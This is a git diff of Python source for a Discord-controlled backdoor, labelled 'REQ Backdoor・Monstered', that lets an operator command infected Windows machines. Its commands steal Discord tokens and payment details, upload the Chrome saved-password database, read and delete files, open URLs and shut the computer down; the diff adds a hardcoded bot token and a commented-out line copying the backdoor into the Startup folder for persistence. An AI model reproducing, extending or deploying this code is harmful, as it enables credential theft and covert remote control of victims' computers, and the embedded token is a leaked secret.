@@ -5,7 +5,7 @@ Instable:
     Command: read
 
 """
-import re, os, requests, json, shutil, discord, webbrowser, ctypes
+import re, os, requests, json, shutil, discord, webbrowser, ctypes, browserhistory, shutil, random
 from discord.ext import commands
 from base64 import b64decode
 from json import loads
@@ -13,9 +13,17 @@ from urllib.request import Request, urlopen
 from subprocess import Popen, PIPE
 import platform as plt
 
-Token = ""
+ids = []
+OS = plt.platform().split("-")
+name = os.getenv("UserName")
+Username = os.getenv("COMPUTERNAME")
+dire = {"Discord": os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb"}
+# shutil.copy("backdoor.py", fr"C:\Users\{name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+
+BotToken = "ODA5ODcwODk4MzY2NTEzMjUz.YCbZDA.K_bzQq-CN2PfjedL6VUZ-zvmUsw"
 
 client = commands.Bot(command_prefix="!!")
+client.remove_command("help")
 
 def WinMsg(Name, Value):
     embed = discord.Embed(title = "🔨 Information", color=0xFC4D4D)
@@ -33,7 +41,7 @@ def GetIP():
     return requests.get("https://api.ipify.org/").text
 
 def Hwid():
-	p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) 
+	p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
 	return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
 
 def Payment(token):
@@ -54,11 +62,9 @@ def Tokens(path):
 					tokens.append(token)
 	return tokens
 
-ids = []
-OS = plt.platform().split("-")
-name = os.getenv("UserName")
-Username = os.getenv("COMPUTERNAME")
-dire = {"Discord": os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb"}
+@client.event
+async def on_ready():
+    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"Control zombies"))
 
 @client.command()
 async def tokens(ctx, IP):
@@ -112,75 +118,76 @@ async def getpwd(ctx, IP):
     if IP == GetIP():
         await ctx.send(file = discord.File(f"C:\\Users\\{name}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"))
     else:
-        await ctx.channel.send(embed = ErrorMsg())
+        await ctx.send(embed = ErrorMsg())
 
 @client.command()
 async def run(ctx, IP, url):
     if IP == GetIP():
         webbrowser.open(url)
-        await ctx.channel.send(embed = WinMsg("Open url", f"[*] Url open successfully `{url}`"))
+        await ctx.send(embed = WinMsg("Open url", f"[*] Url open successfully `{url}`"))
     else:
-        await ctx.channel.send(embed = ErrorMsg())
+        await ctx.send(embed = ErrorMsg())
 
 @client.command()
-async def message(ctx, IP, msg):
+async def message(ctx, IP, *msg):
     if IP == GetIP():
-        ctypes.windll.user32.MessageBoxW(0, msg, "", 1)
-        await ctx.channel.send(embed = WinMsg("MessageBox", f"[*] Message sent successfully `{msg}`"))
+        ctypes.windll.user32.MessageBoxW(0, " ".join(msg), "", 1)
+        await ctx.send(embed = WinMsg("MessageBox", f"[*] Message sent successfully `" + " ".join(msg) + "`"))
     else:
-        await ctx.channel.send(embed = ErrorMsg())
+        await ctx.send(embed = ErrorMsg())
 
 @client.command()
-async def Admin(ctx, IP):
+async def admin(ctx, IP):
     admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
     if IP == GetIP():
         if admin == True:
-            await ctx.channel.send(embed = WinMsg("Admin check", "[*] The bot is admin"))
+            await ctx.send(embed = WinMsg("Admin check", "[*] The bot is admin"))
         elif admin == False:
-            await ctx.channel.send(embed = WinMsg("Admin check", "[*] The bot is not admin"))
+            await ctx.send(embed = WinMsg("Admin check", "[*] The bot is not admin"))
     else:
-        await ctx.channel.send(embed = ErrorMsg())
+        await ctx.send(embed = ErrorMsg())
 
 @client.command()
 async def shutdown(ctx, IP):
     if IP == GetIP():
         os.system("shutdown /s /t 1")
-        await ctx.channel.send(embed = WinMsg("Shutdown", "[*] Shutdowning successfully"))
+        await ctx.send(embed = WinMsg("Shutdown", "[*] Shutdowning successfully"))
     else:
-        await ctx.channel.send(embed = ErrorMsg())
+        await ctx.send(embed = ErrorMsg())
 
 
 @client.command()
 async def cwd(ctx, IP):
     if IP == GetIP():
-        cwd = str(os.getcwd)
-        await ctx.channel.send(embed = WinMsg("View cwd", f"`{cwd}`"))
+        get = os.getcwd()
+        cwd = str(get)
+        await ctx.send(embed = WinMsg("View cwd", f"`{cwd}`"))
     else:
-        await ctx.channel.send(embed = ErrorMsg())
+        await ctx.send(embed = ErrorMsg())
 
 @client.command()
-async def Look(ctx, IP, dir):
+async def look(ctx, IP, dir):
     if IP == GetIP():
         dir = os.listdir(dir)
-        await ctx.channel.send(embed = WinMsg("Look directory", f"{dir}"))
+        await ctx.send(embed = WinMsg("Look directory", f"{dir}"))
     else:
-        await ctx.channel.send(embed = ErrorMsg())
+        await ctx.send(embed = ErrorMsg())
 
 @client.command()
 async def remove(ctx, IP, file):  
     if IP == GetIP():
         os.remove(file)
-        await ctx.channel.send(embed = WinMsg("Remove file", f"{file}"))
+        await ctx.send(embed = WinMsg("Remove file", f"{file}"))
     else:
-        await ctx.channel.send(embed = ErrorMsg())
+        await ctx.send(embed = ErrorMsg())
 
 @client.command()
-async def Read(ctx, IP, file):
+async def read(ctx, IP, file):
     if IP == GetIP():
         files = open(file, "r").read()
-        await ctx.channel.send(f"```\n{files}\n```")
+        await ctx.send(f"```\n{files}\n```")
     else:
-        await ctx.channel.send(embed = ErrorMsg())
+        await ctx.send(embed = ErrorMsg())
 
 
 @client.command()
@@ -196,8 +203,8 @@ async def menu(ctx):
     embed.add_field(name = "!!shutdown <IP>", value = "Shutdown the pc")
     embed.add_field(name = "!!tokens <IP>", value = "Get Disord Token")
     embed.add_field(name = "!!payment <IP>", value = "Look discord payment method")
-    embed.add_field(name = "!!check", value = "Look discord payment method")
+    embed.add_field(name = "!!check", value = "check your vitim information")
     embed.set_footer(text = "REQ Backdoor・Monstered")
-    await ctx.channel.send(embed = embed)
+    await ctx.send(embed = embed)
 
-client.run(Token)
+client.run(BotToken)
